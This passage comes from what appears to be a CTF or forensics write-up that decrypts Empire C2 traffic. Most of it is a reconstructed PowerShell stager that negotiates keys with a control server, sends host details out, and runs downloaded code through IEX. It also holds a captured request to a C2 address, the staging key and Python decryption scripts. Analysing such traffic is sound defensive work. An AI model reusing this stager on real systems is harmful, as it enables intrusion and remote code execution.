</span></span><span style="display:flex;"><span>            $wc = New - Object System.Net.WebClient;
</span></span><span style="display:flex;"><span>            $wc.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::GetSystemWebProxy();
</span></span><span style="display:flex;"><span>            $wc.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultCredentials;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($Script:Proxy)  {
</span></span><span style="display:flex;"><span>                $wc.Proxy = $Script:Proxy;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $wc.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, $script:UserAgent);
</span></span><span style="display:flex;"><span>            $script:Headers.GetEnumerator() | % {
</span></span><span style="display:flex;"><span>                $wc.Headers.Add($_.Name, $_.Value)
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            $wc.Headers.Add(<span style="color:#e6db74">&#34;Cookie&#34;</span>, <span style="color:#e6db74">&#34;session=</span>$RoutingCookie<span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>            $taskURI = $script:TaskURIs | Get - Random;
</span></span><span style="display:flex;"><span>            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex]  +  $taskURI);
</span></span><span style="display:flex;"><span>            $result;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> [<span style="color:#66d9ef">Net.WebException</span>] {
</span></span><span style="display:flex;"><span>        $script:MissedCheckins += <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($_.Exception.GetBaseException().Response.statuscode  - eq <span style="color:#ae81ff">401</span>)  {
</span></span><span style="display:flex;"><span>            Start - Negotiate  - S <span style="color:#e6db74">&#34;</span>$ser<span style="color:#e6db74">&#34;</span>  - SK $SK  - UA $ua;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Start - Negotiate {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>($s, $SK, $UA = \<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    rv:11.0) like Gecko\&#39;</span>, $hop)function ConvertTo - RC4ByteStream {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">Param</span> ($RCK, $In)<span style="color:#66d9ef">begin</span> {
</span></span><span style="display:flex;"><span>            [<span style="color:#66d9ef">Byte[]</span>] $Str = <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span>;
</span></span><span style="display:flex;"><span>            $J = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span> | <span style="color:#66d9ef">ForEach</span> - Object {
</span></span><span style="display:flex;"><span>                $J = ($J  +  $Str[$_]  +  $RCK[$_ % $RCK.Length]) % <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            $I = $J = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">process</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ForEach</span>($Byte <span style="color:#66d9ef">in</span> $In) {
</span></span><span style="display:flex;"><span>                $I = ($I  +  <span style="color:#ae81ff">1</span>) % <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>                $J = ($J  +  $Str[$I]) % <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
</span></span><span style="display:flex;"><span>                $Byte  - bxor $Str[($Str[$I]  +  $Str[$J]) % <span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> Decrypt - Bytes {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">param</span> ($Key, $In)<span style="color:#66d9ef">if</span> ($In.Length  - gt <span style="color:#ae81ff">32</span>)  {
</span></span><span style="display:flex;"><span>            $HMAC = New - Object System.Security.Cryptography.HMACSHA256;
</span></span><span style="display:flex;"><span>            $e = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII;
</span></span><span style="display:flex;"><span>            $Mac = $In[ - <span style="color:#ae81ff">10</span>.. - <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            $In = $In[<span style="color:#ae81ff">0</span>..($In.length  -  <span style="color:#ae81ff">11</span>)];
</span></span><span style="display:flex;"><span>            $hmac.Key = $e.GetBytes($Key);
</span></span><span style="display:flex;"><span>            $Expected = $hmac.ComputeHash($In)[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.9</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (@(Compare - Object $Mac $Expected  - Sync <span style="color:#ae81ff">0</span>).Length  - ne <span style="color:#ae81ff">0</span>)  {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $IV = $In[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.15</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>                $AES = New - Object System.Security.Cryptography.RijndaelManaged;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $AES.Mode = <span style="color:#e6db74">&#34;CBC&#34;</span>;
</span></span><span style="display:flex;"><span>            $AES.Key = $e.GetBytes($Key);
</span></span><span style="display:flex;"><span>            $AES.IV = $IV;
</span></span><span style="display:flex;"><span>            ($AES.CreateDecryptor()).TransformFinalBlock(($In[<span style="color:#ae81ff">16</span>..$In.length]), <span style="color:#ae81ff">0</span>, $In.Length - <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $Null = [<span style="color:#66d9ef">Reflection.Assembly</span>]::LoadWithPartialName(<span style="color:#e6db74">&#34;System.Security&#34;</span>);
</span></span><span style="display:flex;"><span>    $Null = [<span style="color:#66d9ef">Reflection.Assembly</span>]::LoadWithPartialName(<span style="color:#e6db74">&#34;System.Core&#34;</span>);
</span></span><span style="display:flex;"><span>    $ErrorActionPreference = <span style="color:#e6db74">&#34;SilentlyContinue&#34;</span>;
</span></span><span style="display:flex;"><span>    $e = [<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8;
</span></span><span style="display:flex;"><span>    $customHeaders = <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    $SKB = $e.GetBytes($SK);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        $AES = New - Object System.Security.Cryptography.RijndaelManaged;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $IV = [<span style="color:#66d9ef">byte</span>] <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span> | Get - Random  - count <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    $AES.Mode = <span style="color:#e6db74">&#34;CBC&#34;</span>;
</span></span><span style="display:flex;"><span>    $AES.Key = $SKB;
</span></span><span style="display:flex;"><span>    $AES.IV = $IV;
</span></span><span style="display:flex;"><span>    $hmac = New - Object System.Security.Cryptography.HMACSHA256;
</span></span><span style="display:flex;"><span>    $hmac.Key = $SKB;
</span></span><span style="display:flex;"><span>    $csp = New - Object System.Security.Cryptography.CspParameters;
</span></span><span style="display:flex;"><span>    $csp.Flags = $csp.Flags  - bor [<span style="color:#66d9ef">System.Security.Cryptography.CspProviderFlags</span>]::UseMachineKeyStore;
</span></span><span style="display:flex;"><span>    $rs = New - Object System.Security.Cryptography.RSACryptoServiceProvider  - ArgumentList <span style="color:#ae81ff">2048</span>, $csp;
</span></span><span style="display:flex;"><span>    $rk = $rs.ToXmlString($False);
</span></span><span style="display:flex;"><span>    $ID =  - join(<span style="color:#e6db74">&#34;ABCDEFGHKLMNPRSTUVWXYZ123456789&#34;</span>.ToCharArray()|Get - Random  - Count <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    $ib = $e.getbytes($rk);
</span></span><span style="display:flex;"><span>    $eb = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib, <span style="color:#ae81ff">0</span>, $ib.Length);
</span></span><span style="display:flex;"><span>    $eb = $eb + $hmac.ComputeHash($eb)[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.9</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( - not $wc)  {
</span></span><span style="display:flex;"><span>        $wc = New - Object System.Net.WebClient;
</span></span><span style="display:flex;"><span>        $wc.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::GetSystemWebProxy();
</span></span><span style="display:flex;"><span>        $wc.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultCredentials;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($Script:Proxy)  {
</span></span><span style="display:flex;"><span>        $wc.Proxy = $Script:Proxy;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($customHeaders  - ne <span style="color:#e6db74">&#34;&#34;</span>)  {
</span></span><span style="display:flex;"><span>        $headers = $customHeaders  - split \<span style="color:#e6db74">&#39;, \&#39;</span>;
</span></span><span style="display:flex;"><span>        $headers | <span style="color:#66d9ef">ForEach</span> - Object {
</span></span><span style="display:flex;"><span>            $headerKey = $_.split(\<span style="color:#e6db74">&#39;:\&#39;</span>)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>            $headerValue = $_.split(\<span style="color:#e6db74">&#39;:\&#39;</span>)[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($headerKey  - eq <span style="color:#e6db74">&#34;host&#34;</span>)  {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                    $ig = $WC.DownloadData($s)
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            $wc.Headers.Add($headerKey, $headerValue);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $wc.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, $UA);
</span></span><span style="display:flex;"><span>    $IV = [<span style="color:#66d9ef">BitConverter</span>]::GetBytes($(Get - Random));
</span></span><span style="display:flex;"><span>    $data = $e.getbytes($ID)  +  @(0x01, 0x02, 0x00, 0x00)  +  [<span style="color:#66d9ef">BitConverter</span>]::GetBytes($eb.Length);
</span></span><span style="display:flex;"><span>    $rc4p = ConvertTo - RC4ByteStream  - RCK $($IV + $SKB)  - <span style="color:#66d9ef">In</span> $data;
</span></span><span style="display:flex;"><span>    $rc4p = $IV  +  $rc4p  +  $eb;
</span></span><span style="display:flex;"><span>    $raw = $wc.UploadData($s + <span style="color:#e6db74">&#34;/login/process.php&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>, $rc4p);
</span></span><span style="display:flex;"><span>    $de = $e.GetString($rs.decrypt($raw, $false));
</span></span><span style="display:flex;"><span>    $nonce = $de[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.15</span>]  - join \<span style="color:#e6db74">&#39;\&#39;</span>;
</span></span><span style="display:flex;"><span>    $key = $de[<span style="color:#ae81ff">16</span>..$de.length]  - join \<span style="color:#e6db74">&#39;\&#39;</span>;
</span></span><span style="display:flex;"><span>    $nonce = [<span style="color:#66d9ef">String</span>]([<span style="color:#66d9ef">long</span>]$nonce  +  <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        $AES = New - Object System.Security.Cryptography.RijndaelManaged;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $IV = [<span style="color:#66d9ef">byte</span>] <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.255</span> | Get - Random  - Count <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span>    $AES.Mode = <span style="color:#e6db74">&#34;CBC&#34;</span>;
</span></span><span style="display:flex;"><span>    $AES.Key = $e.GetBytes($key);
</span></span><span style="display:flex;"><span>    $AES.IV = $IV;
</span></span><span style="display:flex;"><span>    $i = $nonce + \<span style="color:#e6db74">&#39;|\&#39;</span> + $s + \<span style="color:#e6db74">&#39;|\&#39;</span> + [<span style="color:#66d9ef">Environment</span>]::UserDomainName + \<span style="color:#e6db74">&#39;|\&#39;</span> + [<span style="color:#66d9ef">Environment</span>]::UserName + \<span style="color:#e6db74">&#39;|\&#39;</span> + [<span style="color:#66d9ef">Environment</span>]::MachineName;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $p = (gwmi Win32_NetworkAdapterConfiguration|Where {
</span></span><span style="display:flex;"><span>            $_.IPAddress
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        |Select  - Expand IPAddress);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        $p = <span style="color:#e6db74">&#34;[FAILED]&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $ip = @ {
</span></span><span style="display:flex;"><span>        $true = $p[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>        $false = $p
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    [$p.Length  - lt <span style="color:#ae81ff">6</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (!$ip  - or $ip.trim()  - eq \<span style="color:#e6db74">&#39;\&#39;</span>)  {
</span></span><span style="display:flex;"><span>        $ip = \<span style="color:#e6db74">&#39;0.0.0.0\&#39;</span>
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    $i += <span style="color:#e6db74">&#34;|</span>$ip<span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $i += \<span style="color:#e6db74">&#39;|\&#39;</span> + (Get - WmiObject Win32_OperatingSystem).Name.split(\<span style="color:#e6db74">&#39;|\&#39;</span>)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        $i += \<span style="color:#e6db74">&#39;|\&#39;</span> + \<span style="color:#e6db74">&#39;[FAILED]\&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (([<span style="color:#66d9ef">Environment</span>]::UserName).ToLower()  - eq <span style="color:#e6db74">&#34;system&#34;</span>)  {
</span></span><span style="display:flex;"><span>        $i += <span style="color:#e6db74">&#34;|True&#34;</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $i += \<span style="color:#e6db74">&#39;|\&#39;</span>  + ([<span style="color:#66d9ef">Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity</span>]::GetCurrent()).IsInRole([<span style="color:#66d9ef">Security.Principal.WindowsBuiltInRole</span>] <span style="color:#e6db74">&#34;Administrator&#34;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $n = [<span style="color:#66d9ef">System.Diagnostics.Process</span>]::GetCurrentProcess();
</span></span><span style="display:flex;"><span>    $i += \<span style="color:#e6db74">&#39;|\&#39;</span> + $n.ProcessName + \<span style="color:#e6db74">&#39;|\&#39;</span> + $n.Id;
</span></span><span style="display:flex;"><span>    $i += <span style="color:#e6db74">&#34;|powershell|&#34;</span>  +  $PSVersionTable.PSVersion.Major;
</span></span><span style="display:flex;"><span>    $i += <span style="color:#e6db74">&#34;|&#34;</span>  +  $env:PROCESSOR_ARCHITECTURE;
</span></span><span style="display:flex;"><span>    $ib2 = $e.getbytes($i);
</span></span><span style="display:flex;"><span>    $eb2 = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib2, <span style="color:#ae81ff">0</span>, $ib2.Length);
</span></span><span style="display:flex;"><span>    $hmac.Key = $e.GetBytes($key);
</span></span><span style="display:flex;"><span>    $eb2 = $eb2 + $hmac.ComputeHash($eb2)[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.9</span>];
</span></span><span style="display:flex;"><span>    $IV2 = [<span style="color:#66d9ef">BitConverter</span>]::GetBytes($(Get - Random));
</span></span><span style="display:flex;"><span>    $data2 = $e.getbytes($ID)  +  @(0x01, 0x03, 0x00, 0x00)  +  [<span style="color:#66d9ef">BitConverter</span>]::GetBytes($eb2.Length);
</span></span><span style="display:flex;"><span>    $rc4p2 = ConvertTo - RC4ByteStream  - RCK $($IV2 + $SKB)  - <span style="color:#66d9ef">In</span> $data2;
</span></span><span style="display:flex;"><span>    $rc4p2 = $IV2  +  $rc4p2  +  $eb2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($customHeaders  - ne <span style="color:#e6db74">&#34;&#34;</span>)  {
</span></span><span style="display:flex;"><span>        $headers = $customHeaders  - split \<span style="color:#e6db74">&#39;, \&#39;</span>;
</span></span><span style="display:flex;"><span>        $headers | <span style="color:#66d9ef">ForEach</span> - Object {
</span></span><span style="display:flex;"><span>            $headerKey = $_.split(\<span style="color:#e6db74">&#39;:\&#39;</span>)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>            $headerValue = $_.split(\<span style="color:#e6db74">&#39;:\&#39;</span>)[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($headerKey  - eq <span style="color:#e6db74">&#34;host&#34;</span>)  {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                    $ig = $WC.DownloadData($s)
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            };
</span></span><span style="display:flex;"><span>            $wc.Headers.Add($headerKey, $headerValue);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $wc.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, $UA);
</span></span><span style="display:flex;"><span>    $wc.Headers.Add(<span style="color:#e6db74">&#34;Hop-Name&#34;</span>, $hop);
</span></span><span style="display:flex;"><span>    $raw = $wc.UploadData($s + <span style="color:#e6db74">&#34;/admin/get.php&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>, $rc4p2);
</span></span><span style="display:flex;"><span>    IEX $( $e.GetString($(Decrypt - Bytes  - Key $key  - <span style="color:#66d9ef">In</span> $raw)) );
</span></span><span style="display:flex;"><span>    $AES = $null;
</span></span><span style="display:flex;"><span>    $s2 = $null;
</span></span><span style="display:flex;"><span>    $wc = $null;
</span></span><span style="display:flex;"><span>    $eb2 = $null;
</span></span><span style="display:flex;"><span>    $raw = $null;
</span></span><span style="display:flex;"><span>    $IV = $null;
</span></span><span style="display:flex;"><span>    $wc = $null;
</span></span><span style="display:flex;"><span>    $i = $null;
</span></span><span style="display:flex;"><span>    $ib2 = $null;
</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">GC</span>]::Collect();
</span></span><span style="display:flex;"><span>    LRFT7  - Servers @(($s  - split <span style="color:#e6db74">&#34;/&#34;</span>)[<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.2</span>]  - join <span style="color:#e6db74">&#34;/&#34;</span>)  - StagingKey $SK  - SessionKey $key  - SessionID $ID  - WorkingHours <span style="color:#e6db74">&#34;&#34;</span>  - KillDate <span style="color:#e6db74">&#34;&#34;</span>  - ProxySettings $Script:Proxy;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Start - Negotiate  - s <span style="color:#e6db74">&#34;</span>$ser<span style="color:#e6db74">&#34;</span>  - SK \<span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G &gt; TRWq(#b\&#39;</span>  - UA $u  - hop <span style="color:#e6db74">&#34;</span>$hop<span style="color:#e6db74">&#34;</span>;
</span></span></code></pre></div><h1 id="stage-1">Stage 1<a hidden class="anchor" aria-hidden="true" href="#stage-1">#</a></h1>
<p>Continuing with the next pair of HTTP request-response, we are met with the following packet:</p>
<pre tabindex="0"><code>POST /login/process.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Content-Length: 462

......&lt;T.L.....W&#39;......%F..S$a}!.h.dX...V..;
:7~.......80..C...HU.^.V....b.=dj
Dj.....x..s.......x8&#34;..U.......J..E*....5H......sG&#39;&gt;#..O.V.8F.}b.wt.:..=U.
....@
%.-.V.....l.......R...R.P%....&lt;/%8...H.f,..5.-.t.W*p..*...k.g.3..B..eX1O}....3.....!J.^l..S.I.a......Am.....DU+....8.......v.()a.ihv...........wd..{.:&amp;./T...xY_.H.w.O..@N..]v...M....&#39;..|..j9.....?n..G..r.)...BN..Pp\1!k.].#.....c%.2........aTOt.`}...Z........W..)....!.E.G...+.(...r...6........k..^h@B.!HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 256
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

{.0c...R~..`.^...W./............T2.k..fZAIH.......!.6.+..$)..&gt;.`E.......OC...C.=.. s....k1+.%.h....g...aD.d}....U.....
...Ykf..nTfW.g..EzR....
...:V....}K.}y.NhE.v..r....0..C..H..sP.9.Vo..i.b|.S.....?.s&amp;.BXv3..._P........^8..h...32./.Xd..*.....{.~..7.c.+..
</code></pre><p>Based on the articles instructions, we update our script to decrypt the first [4:19] bytes to see at what stage we are now:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>
</span></span><span style="display:flex;"><span>enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encr_data <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(enc_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(encr_data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> key)
</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encr_data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">19</span>])
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] RC4 Decrypted:&#34;</span>, msg)
</span></span></code></pre></div><p>And we get the following: <code>[+] RC4 Decrypted: b'EBXWPAHZ\x01\x02\x00\x00\xba\x01\x00'</code>.<br>
Notice that the third column has changed from <code>01</code> to <code>02</code> indicating we are now in stage 1. The <code>\xba\x01</code> indicates how many bytes has to still be decrypted (after the first 20 bytes we just decrypted) to successfully decrypt the rest of the payload.</p>
<h2 id="stage-1---aes-decryption-to-get-rsa-pubkey">Stage 1 - AES decryption to get RSA PubKey<a hidden class="anchor" aria-hidden="true" href="#stage-1---aes-decryption-to-get-rsa-pubkey">#</a></h2>
<p>The twist here is that Empire C2 based on the article, in stage 2, uses AES decryption to decrypt the rest of the <code>\xba\x01</code> bytes. This can also be assumed from the decrypted STAGE 0 payload that contained powershell code performing <code>AES CBC</code> decryption.</p>
<p>Based on this information, we update our script to handle the remaining bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span>  AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_decrypt</span>(ciphertext, key):
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pad(ciphertext, AES<span style="color:#f92672">.</span>block_size)
</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> ciphertext[:<span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(ciphertext[<span style="color:#ae81ff">16</span>:])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ewtVZiN~5)13Cx.M@oOJyp^G&gt;TRWq(#b&#39;</span>
